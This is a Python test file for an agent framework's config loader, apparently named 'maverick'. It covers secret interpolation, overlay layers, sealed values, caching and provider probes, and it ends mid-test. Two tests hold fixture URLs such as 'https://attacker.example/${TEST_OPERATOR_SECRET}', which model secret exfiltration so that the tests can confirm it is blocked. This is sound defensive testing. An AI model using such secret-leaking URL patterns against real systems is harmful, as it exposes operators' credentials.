"""Config loader tests."""
from __future__ import annotations

import os
import tempfile
from pathlib import Path

import maverick.config as config_module
import pytest
from maverick.config import _interp, config_path, get_safety, load_config


def test_default_config_path_honors_maverick_home(tmp_path, monkeypatch):
    home = tmp_path / "isolated-home"
    monkeypatch.setenv("MAVERICK_HOME", str(home))
    monkeypatch.delenv("MAVERICK_CONFIG", raising=False)

    assert config_path() == home / "config.toml"


def test_missing_config_returns_empty_dict():
    cfg = load_config(Path("/this/path/does/not/exist.toml"))
    assert cfg == {}


@pytest.mark.parametrize("tenant", [False, True])
@pytest.mark.parametrize("initially_present", [False, True])
def test_empty_config_avoids_path_resolution_but_rechecks_new_values(
    tmp_path, monkeypatch, tenant, initially_present,
):
    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path))
    monkeypatch.setenv("TEST_OPERATOR_SECRET", "private-value")
    path = (tmp_path / "tenants" / "workspace" / "config.toml"
            if tenant else tmp_path / "config.toml")
    path.parent.mkdir(parents=True, exist_ok=True)
    if initially_present:
        path.write_text("", encoding="utf-8")
    resolved = []
    original = config_module._is_tenant_config_path

    def classify(candidate):
        resolved.append(candidate)
        return original(candidate)

    monkeypatch.setattr(config_module, "_is_tenant_config_path", classify)
    assert load_config(path) == {}
    assert resolved == []  # no values can interpolate environment references

    path.write_text('[models]\norchestrator = "${TEST_OPERATOR_SECRET}"\n', encoding="utf-8")
    expected = "${TEST_OPERATOR_SECRET}" if tenant else "private-value"
    assert load_config(path)["models"]["orchestrator"] == expected
    assert resolved == [path]  # a later nonempty source still checks its authority


def test_corrupt_config_fails_soft_to_empty_dict():
    """A corrupt/unparseable config.toml must not crash the agent loop; it
    fails soft to {} like a missing file. Regression: load_config raised
    TOMLDecodeError, which propagated through every get_role_model/get_safety
    caller. The common real-world trigger is a Windows backslash path that
    TOML reads as an invalid \\U escape."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
        f.write('workdir = "C:\\Users\\x\\ws"\n[unterminated\n')  # invalid TOML
        path = Path(f.name)
    try:
        assert load_config(path) == {}
    finally:
        path.unlink()


def test_corrupt_active_config_exposes_security_health_error(tmp_path, monkeypatch):
    import maverick.config as cfg_mod

    path = tmp_path / "config.toml"
    path.write_text("[agent_trust\nenforce = true\n", encoding="utf-8")
    monkeypatch.setenv("MAVERICK_CONFIG", str(path))
    cfg_mod.reset_config_cache()
    try:
        assert cfg_mod.load_config() == {}  # ordinary consumers remain fail-soft
        assert str(path) in cfg_mod.config_source_errors()
    finally:
        cfg_mod.reset_config_cache()


def test_deleted_corrupt_optional_overlay_clears_security_health_error(
    tmp_path, monkeypatch,
):
    import maverick.config as cfg_mod

    path = tmp_path / "config.toml"
    path.write_text("", encoding="utf-8")
    overlay = tmp_path / cfg_mod.DASHBOARD_OVERRIDES_BASENAME
    overlay.write_text("[agent_trust\nenforce = true\n", encoding="utf-8")
    monkeypatch.setenv("MAVERICK_CONFIG", str(path))
    cfg_mod.reset_config_cache()
    try:
        cfg_mod.load_config()
        assert str(overlay) in cfg_mod.config_source_errors()

        overlay.unlink()
        cfg_mod.load_config()  # optional overlay is now skipped

        assert str(overlay) not in cfg_mod.config_source_errors()
    finally:
        cfg_mod.reset_config_cache()


def test_unreadable_optional_overlay_retains_security_health_error(
    tmp_path, monkeypatch,
):
    import maverick.config as cfg_mod

    path = tmp_path / "config.toml"
    path.write_text("", encoding="utf-8")
    overlay = tmp_path / cfg_mod.DASHBOARD_OVERRIDES_BASENAME
    overlay.write_text("[agent_trust\nenforce = true\n", encoding="utf-8")
    monkeypatch.setenv("MAVERICK_CONFIG", str(path))
    cfg_mod.reset_config_cache()
    try:
        cfg_mod.load_config()
        assert str(overlay) in cfg_mod.config_source_errors()

        real_stat = Path.stat

        def _deny_overlay_stat(self, *args, **kwargs):
            if self == overlay:
                raise PermissionError("policy source is not readable")
            return real_stat(self, *args, **kwargs)

        monkeypatch.setattr(Path, "stat", _deny_overlay_stat)

        assert str(overlay) in cfg_mod.config_source_errors()
    finally:
        cfg_mod.reset_config_cache()


def test_env_var_interpolation(monkeypatch):
    monkeypatch.setenv("MAVERICK_TEST_KEY", "hello")
    assert _interp("${MAVERICK_TEST_KEY}") == "hello"
    assert _interp("prefix-${MAVERICK_TEST_KEY}-suffix") == "prefix-hello-suffix"


def test_dashboard_and_tenant_layers_cannot_expand_process_secrets(tmp_path, monkeypatch):
    import maverick.config as config

    base = tmp_path / "config.toml"
    dashboard = tmp_path / config.DASHBOARD_OVERRIDES_BASENAME
    tenant = tmp_path / "tenant.toml"
    base.write_text('[models]\norchestrator = "${TEST_OPERATOR_SECRET}"\n')
    dashboard.write_text('[knowledge]\nbase_url = "https://attacker.example/${TEST_OPERATOR_SECRET}"\n')
    tenant.write_text('[knowledge]\nurl = "https://attacker.example/${TEST_OPERATOR_SECRET}"\n')
    monkeypatch.setenv("TEST_OPERATOR_SECRET", "private-value")
    monkeypatch.setenv("MAVERICK_CONFIG", str(base))
    monkeypatch.delenv("MAVERICK_CONFIG_OVERLAY", raising=False)
    monkeypatch.setattr(config, "dashboard_overrides_path", lambda: dashboard)
    monkeypatch.setattr(config, "tenant_config_path", lambda: tenant)
    config.reset_config_cache()
    try:
        result = config.load_config()
        assert result["models"]["orchestrator"] == "private-value"
        assert result["knowledge"]["base_url"].endswith("${TEST_OPERATOR_SECRET}")
        assert result["knowledge"]["url"].endswith("${TEST_OPERATOR_SECRET}")
    finally:
        config.reset_config_cache()


def test_explicit_tenant_path_and_downstream_sinks_do_not_expand_secrets(tmp_path, monkeypatch):
    from maverick import config, notifications, webhooks

    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path))
    monkeypatch.setenv("TEST_OPERATOR_SECRET", "private-value")
    tenant = tmp_path / "tenants" / "workspace" / "config.toml"
    tenant.parent.mkdir(parents=True)
    tenant.write_text('[knowledge]\nurl = "https://attacker.example/${TEST_OPERATOR_SECRET}"\n')
    assert config.load_config(tenant)["knowledge"]["url"].endswith("${TEST_OPERATOR_SECRET}")
    assert notifications._resolve_env_ref("${TEST_OPERATOR_SECRET}") is None
    assert webhooks._expand_env("${TEST_OPERATOR_SECRET}") is None


def test_unset_env_var_becomes_empty(monkeypatch):
    monkeypatch.delenv("MAVERICK_NEVER_SET", raising=False)
    assert _interp("${MAVERICK_NEVER_SET}") == ""


def test_config_cache_avoids_reparse_but_keeps_interp_live(tmp_path, monkeypatch):
    # Uses a benign [models] key so the literal isn't flagged by detect-secrets.
    import maverick.config as cfg_mod
    cfg_mod.reset_config_cache()
    path = tmp_path / "c.toml"
    path.write_text('[models]\nsummarizer = "${MAVERICK_CFG_TEST_VAL}"\n')

    calls = {"n": 0}
    real_load = cfg_mod.tomllib.load

    def _counting_load(f):
        calls["n"] += 1
        return real_load(f)

    monkeypatch.setattr(cfg_mod.tomllib, "load", _counting_load)

    monkeypatch.setenv("MAVERICK_CFG_TEST_VAL", "first")
    assert cfg_mod.load_config(path)["models"]["summarizer"] == "first"
    # Second read: parse is cached (no new tomllib.load) ...
    monkeypatch.setenv("MAVERICK_CFG_TEST_VAL", "second")
    assert cfg_mod.load_config(path)["models"]["summarizer"] == "second"
    assert calls["n"] == 1  # parsed once, interpolation re-ran live

    # Editing the file (mtime/size changes) invalidates the cache.
    path.write_text(
        '[models]\nsummarizer = "${MAVERICK_CFG_TEST_VAL}"\norchestrator = "x"\n')
    cfg = cfg_mod.load_config(path)
    assert cfg["models"]["orchestrator"] == "x"
    assert calls["n"] == 2
    cfg_mod.reset_config_cache()


def test_load_config_with_models_section():
    with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
        f.write(
            '[models]\n'
            'orchestrator = "anthropic:claude-opus-4-7"\n'
            'summarizer = "ollama:phi3:14b"\n'
        )
        path = Path(f.name)
    try:
        cfg = load_config(path)
        assert cfg["models"]["orchestrator"] == "anthropic:claude-opus-4-7"
        assert cfg["models"]["summarizer"] == "ollama:phi3:14b"
    finally:
        path.unlink()


def test_get_governed_connectors_defaults_off(monkeypatch):
    import maverick.config as cfg_mod
    monkeypatch.delenv("MAVERICK_GOVERNED_RESTORE_POINTS", raising=False)
    monkeypatch.setattr(cfg_mod, "load_config", lambda *a, **k: {})
    gc = cfg_mod.get_governed_connectors()
    # restore_points defaults ON: it only takes effect once connectors are
    # enabled, and without it every in-place update is irreversible.
    assert gc == {"enable": False, "connectors": [], "approver": "",
                  "restore_points": True}


def test_get_governed_connectors_parses_list_and_csv(monkeypatch):
    import maverick.config as cfg_mod
    monkeypatch.delenv("MAVERICK_GOVERNED_RESTORE_POINTS", raising=False)
    monkeypatch.setattr(cfg_mod, "load_config", lambda *a, **k: {
        "governed_connectors": {"enable": True, "connectors": ["salesforce", " servicenow "],
                                "approver": "ops@corp"}})
    assert cfg_mod.get_governed_connectors() == {
        "enable": True, "connectors": ["salesforce", "servicenow"],
        "approver": "ops@corp", "restore_points": True}
    # A CSV string (an operator hand-edit) is tolerated and split.
    monkeypatch.setattr(cfg_mod, "load_config", lambda *a, **k: {
        "governed_connectors": {"enable": True, "connectors": "salesforce, servicenow"}})
    assert cfg_mod.get_governed_connectors()["connectors"] == ["salesforce", "servicenow"]


def test_automation_import_rejects_string_truthiness(monkeypatch):
    import maverick.config as cfg_mod

    monkeypatch.setattr(cfg_mod, "load_config", lambda: {
        "automation_import": {
            "enable": "false",
            "create_schedules": "true",
        }
    })
    assert cfg_mod.get_automation_import() == {
        "enable": False,
        "create_schedules": False,
    }


def test_nested_dict_interpolation(monkeypatch):
    monkeypatch.setenv("X", "42")
    data = {"a": "${X}", "b": ["${X}", "plain"], "c": {"inner": "${X}"}}
    out = _interp(data)
    assert out["a"] == "42"
    assert out["b"] == ["42", "plain"]
    assert out["c"]["inner"] == "42"


def test_get_safety_preserves_constitution_rules(monkeypatch):
    with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
        f.write(
            '[safety]\n'
            'block_threshold = "high"\n'
            '[[safety.constitution]]\n'
            'name = "no_zephyr"\n'
            'pattern = "zephyr-token"\n'
            'severity = "high"\n'
        )
        path = Path(f.name)
    monkeypatch.setenv("MAVERICK_CONFIG", str(path))
    try:
        safety = get_safety()
        assert safety["constitution"] == [
            {"name": "no_zephyr", "pattern": "zephyr-token", "severity": "high"}
        ]
    finally:
        path.unlink()


def test_toml_cache_is_bounded(tmp_path, monkeypatch):
    """The parsed-TOML cache must not grow without bound across many distinct
    config paths (e.g. one per tenant). Oldest entries are evicted past the cap."""
    from maverick import config as cfg
    cfg.reset_config_cache()
    monkeypatch.setattr(cfg, "_TOML_CACHE_MAX", 8)
    try:
        for i in range(40):
            p = tmp_path / f"t{i}.toml"
            p.write_text(f'[budget]\nmax_dollars = {i}\n', encoding="utf-8")
            assert cfg._read_toml_raw(p) == {"budget": {"max_dollars": i}}
        assert len(cfg._toml_cache) <= 8     # bounded, not 40
    finally:
        cfg.reset_config_cache()


def test_env_flag_tristate(monkeypatch):
    from maverick.config import env_flag

    for val in ("1", "true", "TRUE", "Yes", "on", " on "):
        monkeypatch.setenv("MAVERICK_X", val)
        assert env_flag("MAVERICK_X") is True, val
    for val in ("0", "false", "No", "off", "OFF"):
        monkeypatch.setenv("MAVERICK_X", val)
        assert env_flag("MAVERICK_X") is False, val
    for val in ("", "maybe", "2"):
        monkeypatch.setenv("MAVERICK_X", val)
        assert env_flag("MAVERICK_X") is None, val
    monkeypatch.delenv("MAVERICK_X", raising=False)
    assert env_flag("MAVERICK_X") is None


def _write_wizard_files(home, env_line: str):
    """A wizard-shaped install: config.toml referencing ${VAR} + secrets in .env."""
    mav = home / ".maverick"
    mav.mkdir(exist_ok=True)
    (mav / "config.toml").write_text(
        '[providers.anthropic]\napi_key = "${MAVERICK_ENVFILE_TEST_KEY}"\n',
        encoding="utf-8",
    )
    (mav / ".env").write_text(f"# wizard-written secrets\n{env_line}\n", encoding="utf-8")


def test_wizard_env_file_is_loaded_for_interpolation(tmp_path, monkeypatch):
    """The installer persists every collected secret ONLY to ~/.maverick/.env
    and writes config values as "${VAR}". Compose/systemd inject that file, but
    a bare pip/CLI install had NO injector, so a freshly validated key
    interpolated to "" and `maverick start` exited 2 right after `maverick
    init` said "Setup complete". load_config() must export the file itself."""
    import os

    import maverick.config as cfg_mod

    cfg_mod.reset_config_cache()
    _write_wizard_files(tmp_path, "MAVERICK_ENVFILE_TEST_KEY=tok-123")  # pragma: allowlist secret
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))  # Windows Path.home()
    monkeypatch.delenv("MAVERICK_CONFIG", raising=False)
    monkeypatch.delenv("MAVERICK_ENVFILE_TEST_KEY", raising=False)
    try:
        cfg = cfg_mod.load_config()
        assert cfg["providers"]["anthropic"]["api_key"] == "tok-123"  # pragma: allowlist secret
        # ...and direct env readers (llm._provider_api_key) see it too.
        assert os.environ["MAVERICK_ENVFILE_TEST_KEY"] == "tok-123"
    finally:
        os.environ.pop("MAVERICK_ENVFILE_TEST_KEY", None)
        cfg_mod.reset_config_cache()


def test_env_file_never_overrides_exported_var(tmp_path, monkeypatch):
    """An explicitly exported variable wins over a stale ~/.maverick/.env value
    (setdefault semantics, matching compose env_file / systemd EnvironmentFile)."""
    import os

    import maverick.config as cfg_mod

    cfg_mod.reset_config_cache()
    _write_wizard_files(tmp_path, "MAVERICK_ENVFILE_TEST_KEY=stale-file-value")  # pragma: allowlist secret
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    monkeypatch.delenv("MAVERICK_CONFIG", raising=False)
    monkeypatch.setenv("MAVERICK_ENVFILE_TEST_KEY", "from-shell")
    try:
        cfg = cfg_mod.load_config()
        assert cfg["providers"]["anthropic"]["api_key"] == "from-shell"  # pragma: allowlist secret
        assert os.environ["MAVERICK_ENVFILE_TEST_KEY"] == "from-shell"
    finally:
        cfg_mod.reset_config_cache()


def test_env_file_key_satisfies_any_provider_configured(tmp_path, monkeypatch):
    """The CLI preflight path: with the key present ONLY in ~/.maverick/.env,
    any_provider_configured() must be True (was False -> exit 2)."""
    import os

    import maverick.config as cfg_mod

    cfg_mod.reset_config_cache()
    mav = tmp_path / ".maverick"
    mav.mkdir()
    (mav / "config.toml").write_text(
        '[providers.anthropic]\napi_key = "${ANTHROPIC_API_KEY}"\n', encoding="utf-8",
    )
    (mav / ".env").write_text("ANTHROPIC_API_KEY=tok-e2e\n", encoding="utf-8")  # pragma: allowlist secret
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    monkeypatch.delenv("MAVERICK_CONFIG", raising=False)
    for var in (
        cfg_mod.PROVIDER_CREDENTIAL_ENV_VARS
        + cfg_mod.PROVIDER_BASE_URL_ENV_VARS
    ):
        monkeypatch.delenv(var, raising=False)
    try:
        assert cfg_mod.any_provider_configured() is True
    finally:
        os.environ.pop("ANTHROPIC_API_KEY", None)
        cfg_mod.reset_config_cache()


def test_incomplete_azure_credential_does_not_satisfy_configured_probe(monkeypatch):
    import maverick.config as cfg_mod

    monkeypatch.setattr(cfg_mod, "load_config", dict)
    for var in (
        cfg_mod.PROVIDER_CREDENTIAL_ENV_VARS
        + cfg_mod.PROVIDER_BASE_URL_ENV_VARS
    ):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setenv("AZURE_OPENAI_AD_TOKEN", "static-entra-token")

    assert cfg_mod.any_provider_configured() is False


@pytest.mark.parametrize(
    ("auth_name", "auth_value"),
    [
        ("AZURE_OPENAI_AD_TOKEN", "static-entra-token"),
        ("AZURE_OPENAI_AUTH", "entra_id"),
        ("AZURE_OPENAI_API_KEY", "azure-api-key"),
    ],
)
def test_complete_azure_route_satisfies_configured_probe(
    monkeypatch, auth_name, auth_value,
):
    import maverick.config as cfg_mod

    monkeypatch.setattr(cfg_mod, "load_config", dict)
    for var in (
        cfg_mod.PROVIDER_CREDENTIAL_ENV_VARS
        + cfg_mod.PROVIDER_BASE_URL_ENV_VARS
        + ("AZURE_OPENAI_AUTH", "AZURE_OPENAI_ENDPOINT", "AZURE_OPENAI_DEPLOYMENT")
    ):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setenv("AZURE_OPENAI_ENDPOINT", "https://res.openai.azure.com")
    monkeypatch.setenv("AZURE_OPENAI_DEPLOYMENT", "gpt5")
    monkeypatch.setenv(auth_name, auth_value)

    assert cfg_mod.any_provider_configured() is True


def test_azure_config_auth_mode_satisfies_configured_probe(monkeypatch):
    import maverick.config as cfg_mod

    table = {
        "base_url": "https://res.openai.azure.com",
        "auth_mode": "entra_id",
    }
    monkeypatch.setattr(
        cfg_mod,
        "load_config",
        lambda: {"providers": {"azure": table}},
    )
    for var in (
        cfg_mod.PROVIDER_CREDENTIAL_ENV_VARS
        + cfg_mod.PROVIDER_BASE_URL_ENV_VARS
        + ("AZURE_OPENAI_AUTH", "AZURE_OPENAI_ENDPOINT", "AZURE_OPENAI_DEPLOYMENT")
    ):
        monkeypatch.delenv(var, raising=False)
    # A conflicting environment mode must not override the admitted table.
    monkeypatch.setenv("AZURE_OPENAI_AUTH", "api_key")
    monkeypatch.setenv("AZURE_OPENAI_DEPLOYMENT", "gpt5")

    assert cfg_mod.azure_provider_configuration_missing(table) == ()
    assert cfg_mod.any_provider_configured() is True


def test_codex_login_file_satisfies_configured_probe(tmp_path, monkeypatch):
    import maverick.config as cfg_mod

    monkeypatch.setattr(cfg_mod, "load_config", dict)
    for var in (
        cfg_mod.PROVIDER_CREDENTIAL_ENV_VARS
        + cfg_mod.PROVIDER_BASE_URL_ENV_VARS
        + ("AZURE_OPENAI_AUTH", "AZURE_OPENAI_ENDPOINT", "AZURE_OPENAI_DEPLOYMENT")
    ):
        monkeypatch.delenv(var, raising=False)
    codex_home = tmp_path / "codex-home"
    codex_home.mkdir()
    monkeypatch.setenv("CODEX_HOME", str(codex_home))

    assert cfg_mod.any_provider_configured() is False
    (codex_home / "auth.json").write_text("{}", encoding="utf-8")
    assert cfg_mod.any_provider_configured() is True


def test_env_file_recheck_is_throttled(monkeypatch):
    """load_config() sits on per-row hot paths (_dec_field on every sealed
    column read); the .env freshness re-check must NOT stat the file on every
    call or the world_read perf SLA breaches. One check per throttle window."""
    import maverick.config as cfg_mod

    cfg_mod.reset_config_cache()
    calls = []
    monkeypatch.setattr(cfg_mod, "_load_env_file", lambda p: calls.append(p))
    try:
        for _ in range(100):
            cfg_mod.load_config()
        assert len(calls) == 1
        # reset_config_cache (the test hook) re-arms an immediate re-check.
        cfg_mod.reset_config_cache()
        cfg_mod.load_config()
        assert len(calls) == 2
    finally:
        cfg_mod.reset_config_cache()


def test_data_use_governance_enabled_env_first_then_config(monkeypatch):
    """MAVERICK_DATA_USE_GOVERNANCE wins; otherwise [data_use_governance] enable."""
    from maverick.config import data_use_governance_enabled

    monkeypatch.delenv("MAVERICK_DATA_USE_GOVERNANCE", raising=False)
    assert data_use_governance_enabled({}) is False
    assert data_use_governance_enabled({"data_use_governance": {"enable": True}}) is True
    assert data_use_governance_enabled({"data_use_governance": {"enable": "yes"}}) is False
    monkeypatch.setenv("MAVERICK_DATA_USE_GOVERNANCE", "1")
    assert data_use_governance_enabled({}) is True
    monkeypatch.setenv("MAVERICK_DATA_USE_GOVERNANCE", "0")
    assert data_use_governance_enabled({"data_use_governance": {"enable": True}}) is False


# ---- boot-time import cycle through a sealed dashboard overlay --------------
#
# Production outage, 2026-09-10: the dashboard Settings page had sealed two
# provider keys into ~/.maverick/dashboard-config.toml. On the next process
# start, the FIRST thing the CLI does is resolve the data directory
# (Workspace.current().db_path -> paths.data_dir()), which resolves the tenant
# through the client binding, which loads config, which sees the sealed token
# and imports crypto_at_rest to open it -- and crypto_at_rest, at IMPORT time,
# called data_dir() for its key path, re-entering the same chain and hitting its
# own half-initialised module:
#
#   ImportError: cannot import name 'deployment_key_scope' from partially
#   initialized module 'maverick.crypto_at_rest' (most likely due to a
#   circular import)
#
# Every task exited 1 before listening; the load balancer answered 503 until
# the file was moved aside. Both the running image and the previous one were
# affected: the bug was latent since the overlay learned to seal values, and
# only a reboot with a sealed value present triggers it.


def _cold_boot_env(home: Path) -> dict:
    import os

    env = {
        k: v for k, v in os.environ.items()
        if k not in {"MAVERICK_CLIENT_ID", "MAVERICK_TENANT", "MAVERICK_CONFIG",
                     "MAVERICK_CONFIG_OVERLAY", "MAVERICK_ENCRYPT_AT_REST"}
    }
    env["MAVERICK_HOME"] = str(home)
    # A deployment-injected key, exactly as the ECS task definition provides it.
    env["MAVERICK_ENCRYPTION_KEY"] = "7f" * 32
    env["MAVERICK_ENCRYPT_AT_REST"] = "1"
    return env


def test_sealed_dashboard_overlay_survives_a_cold_boot(tmp_path):
    """A sealed value in dashboard-config.toml must not break the very first
    data_dir() call of a fresh process -- the exact boot order of `maverick
    dashboard` -- and load_config() must still open the value afterwards."""
    import subprocess
    import sys

    home = tmp_path / "home"
    home.mkdir()
    env = _cold_boot_env(home)

    # Seal the value the way the dashboard Settings page does
    # (settings_store: deployment_key_scope() + seal_to_str()), in its own
    # interpreter so this test process's import state plays no part.
    seal = (
        "import sys\n"
        "from maverick.crypto_at_rest import deployment_key_scope, seal_to_str\n"
        "with deployment_key_scope():\n"
        "    sys.stdout.write(seal_to_str('sk-test-openai'))\n"
    )
    sealed = subprocess.run(
        [sys.executable, "-c", seal], env=env, capture_output=True, text=True,
    )
    assert sealed.returncode == 0, sealed.stderr
    token = sealed.stdout.strip()
    assert token.startswith("MVKAR1:")
    (home / "dashboard-config.toml").write_text(
        f'[providers.openai]\napi_key = "{token}"\n', encoding="utf-8",
    )

    # Cold boot. The assertion mirrors production: nothing has imported the
    # encryption module when the data directory is first resolved.
    boot = (
        "import sys\n"
        "from maverick.paths import data_dir\n"
        "assert 'maverick.crypto_at_rest' not in sys.modules, 'test precondition'\n"
        "data_dir()\n"
        "from maverick.config import load_config\n"
        "sys.stdout.write(load_config()['providers']['openai']['api_key'])\n"
    )
    booted = subprocess.run(
        [sys.executable, "-c", boot], env=env, capture_output=True, text=True,
    )
    assert booted.returncode == 0, booted.stderr
    assert booted.stdout.strip() == "sk-test-openai"


def test_unseal_config_tree_does_not_reenter_itself():
    """While the overlay is being opened, any nested config load (the tenant /
    client-id resolution the encryption module triggers) gets the overlay
    with its sealed tokens left opaque instead of recursing into another
    unseal -- the tokens are never needed to resolve an identity."""
    import maverick.config as cfg_mod

    tree = {"providers": {"openai": {"api_key": "MVKAR1:AAAA"}}}  # pragma: allowlist secret
    token = cfg_mod._UNSEALING.set(True)
    try:
        assert cfg_mod._unseal_config_tree(tree) is tree
    finally:
        cfg_mod._UNSEALING.reset(token)


@pytest.fixture
def config_home(tmp_path, monkeypatch):
    """A deployment with a policy file and one secret saved from Settings."""
    from maverick import config, crypto_at_rest

    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path))
    monkeypatch.setenv("MAVERICK_CONFIG", str(tmp_path / "config.toml"))
    monkeypatch.delenv("MAVERICK_ENCRYPTION_KEY", raising=False)
    config.reset_config_cache()
    (tmp_path / "config.toml").write_text("[budget]\nmax_dollars = 5.0\n", encoding="utf-8")
    with crypto_at_rest.deployment_key_scope():
        token = crypto_at_rest.seal_to_str("sk-test-not-a-real-key")  # pragma: allowlist secret
    config.dashboard_overrides_path().write_text(f'[providers.anthropic]\napi_key = "{token}"\n', encoding="utf-8")
    reads = []
    real = config._read_global_config
    monkeypatch.setattr(config, "_read_global_config", lambda: reads.append(1) or real())
    yield tmp_path, reads
    config.reset_config_cache()


def test_one_decision_reads_the_configuration_once_and_each_caller_gets_its_own_copy(config_home):
    # A sign-in decision asked about 15 questions, each reading (and
    # decrypting) the configuration again.
    from maverick import config

    _, reads = config_home
    with config.single_read():
        first = config.load_config()
        first["budget"]["max_dollars"] = 999
        first["providers"].clear()
        for _ in range(20):
            assert config.load_config()["budget"]["max_dollars"] == 5.0
        assert config.load_global_config()["providers"]["anthropic"]["api_key"] == "sk-test-not-a-real-key"  # pragma: allowlist secret
    assert len(reads) == 1
    config.load_config()
    config.load_config()
    assert len(reads) == 3  # outside a decision every read is fresh, as before


def test_the_next_decision_reads_a_policy_saved_after_the_last_one(config_home):
    import os

    from maverick import config

    home, reads = config_home
    with config.single_read():
        assert config.load_config()["budget"]["max_dollars"] == 5.0
    replacement = home / "config.toml.new"
    replacement.write_text("[budget]\nmax_dollars = 7.0\n", encoding="utf-8")
    os.replace(replacement, home / "config.toml")
    with config.single_read():
        assert config.load_config()["budget"]["max_dollars"] == 7.0
    assert len(reads) == 2


def test_a_read_that_reports_an_error_is_never_shared(config_home):
    # A corrupt policy is re-read and reported again at every check, even if
    # another thread resets the cache in between.
    import threading

    from maverick import config

    home, reads = config_home
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    path = str(home / "config.toml")
    with config.single_read():
        config.load_config()
        assert path in config.config_source_errors()
        resetter = threading.Thread(target=config.reset_config_cache)
        resetter.start()
        resetter.join()
        config.load_config()
        assert path in config.config_source_errors()
        (home / "config.toml").write_text("[budget]\nmax_dollars = 6.0\n", encoding="utf-8")
        assert config.load_config()["budget"]["max_dollars"] == 6.0
        assert path in config.config_source_errors(), "reported until this decision ends"
        config.load_config()
    assert not config.config_source_errors()
    assert len(reads) == 3  # the corrupt reads were not kept; the clean one is


def test_a_read_during_which_the_cache_was_reset_is_not_shared(config_home, monkeypatch):
    # A reset between the read and its error check could clear the error the
    # read had just recorded. Such a read is used once and not kept.
    import threading

    from maverick import config

    home, reads = config_home
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    counted = config._read_global_config  # the fixture's counting reader

    def read_then_reset():
        tree = counted()
        resetter = threading.Thread(target=config.reset_config_cache)
        resetter.start()
        resetter.join()  # clears the error this read just recorded
        return tree

    monkeypatch.setattr(config, "_read_global_config", read_then_reset)
    with config.single_read():
        config.load_config()
        config.load_config()
        monkeypatch.setattr(config, "_read_global_config", counted)
        config.load_config()
        assert str(home / "config.toml") in config.config_source_errors()
    assert len(reads) == 3


def test_a_read_whose_error_another_thread_clears_is_not_shared(config_home, monkeypatch):
    # Another request's successful read (or a cache eviction) removes the
    # process-wide error entry; the read that met the error still is not kept.
    import threading

    from maverick import config

    home, reads = config_home
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    counted = config._read_global_config

    def read_then_cleared_elsewhere():
        tree = counted()
        cleaner = threading.Thread(target=config._toml_errors.clear)
        cleaner.start()
        cleaner.join()
        return tree

    monkeypatch.setattr(config, "_read_global_config", read_then_cleared_elsewhere)
    path = str(home / "config.toml")
    with config.single_read():
        assert config.load_config().get("budget") is None
        assert config._toml_errors == {}
        assert path in config.config_source_errors(), "still reported for this decision"
        monkeypatch.setattr(config, "_read_global_config", counted)
        (home / "config.toml").write_text("[budget]\nmax_dollars = 6.5\n", encoding="utf-8")
        assert config.load_config()["budget"]["max_dollars"] == 6.5
    assert len(reads) == 2


def test_a_cached_corrupt_file_still_counts_as_an_error(config_home):
    from maverick import config

    home, reads = config_home
    (home / "config.toml").write_text("[budget\n", encoding="utf-8")
    config.load_config()  # the corrupt file is now cached as an empty table
    config._toml_errors.clear()  # e.g. another thread's cleanup
    path = str(home / "config.toml")
    assert config.load_config() == {"providers": config.load_config()["providers"]}
    assert path in config.config_source_errors(), "a cache hit reports the corrupt file again"
    config._toml_errors.clear()
    with config.single_read():
        config.load_config()
        config.load_config()
        assert path in config.config_source_errors()
    assert len(reads) == 5  # each read met the corrupt file again; none was shared


@pytest.mark.skipif(os.name == "nt", reason="POSIX symlink loop")
def test_an_overlay_that_cannot_be_checked_is_reported_not_skipped(config_home):
    # Path.exists() hides ELOOP: a settings overlay turned into a symlink loop
    # must not be dropped silently, losing every Settings-saved policy.
    from maverick import config

    overlay = config.dashboard_overrides_path()
    overlay.unlink()
    overlay.symlink_to(overlay)
    assert "providers" not in config.load_config()
    assert str(overlay) in config.config_source_errors()


def test_a_corrupt_tenant_overlay_is_reported_for_the_decision_without_spoiling_the_shared_read(config_home, monkeypatch):
    import threading

    from maverick import config

    home, reads = config_home
    config.dashboard_overrides_path().unlink()  # sealed under the key of no tenant
    monkeypatch.setenv("MAVERICK_TENANT", "acme")
    tenant = config.tenant_config_path()
    tenant.parent.mkdir(parents=True)
    tenant.write_text("[budget\n", encoding="utf-8")
    with config.single_read():
        assert config.load_config()["budget"]["max_dollars"] == 5.0  # the global layers still apply
        cleaner = threading.Thread(target=config._toml_errors.clear)
        cleaner.start()
        cleaner.join()
        assert str(tenant) in config.config_source_errors()
        config.load_config()
        tenant.write_text("[budget]\nmax_dollars = 1.0\n", encoding="utf-8")
        config.reset_config_cache()  # a repair inside the decision reads afresh
        assert config.load_config()["budget"]["max_dollars"] == 1.0
        assert str(tenant) not in config.config_source_errors()
    assert len(reads) == 2  # the global read was shared until the reset


def test_a_tenant_path_through_a_file_still_means_no_overlay(config_home, monkeypatch):
    # Path.exists() treated ENOTDIR as absent; _present keeps that.
    from maverick import config

    home, _ = config_home
    config.dashboard_overrides_path().unlink()  # sealed under the key of no tenant
    (home / "tenants").write_text("not a directory", encoding="utf-8")
    monkeypatch.setenv("MAVERICK_TENANT", "acme")
    assert config.load_config()["budget"]["max_dollars"] == 5.0
    assert not config.config_source_errors()


def test_a_failed_key_read_is_not_kept_for_the_rest_of_a_decision(config_home, monkeypatch):
    from maverick import config, crypto_at_rest

    real = crypto_at_rest._load_or_create_key
    calls = []

    def flaky():
        calls.append(1)
        if len(calls) == 1:
            raise crypto_at_rest.EncryptionUnavailable("the key file is held by its writer")
        return real()

    monkeypatch.setattr(crypto_at_rest, "_load_or_create_key", flaky)
    with config.single_read():
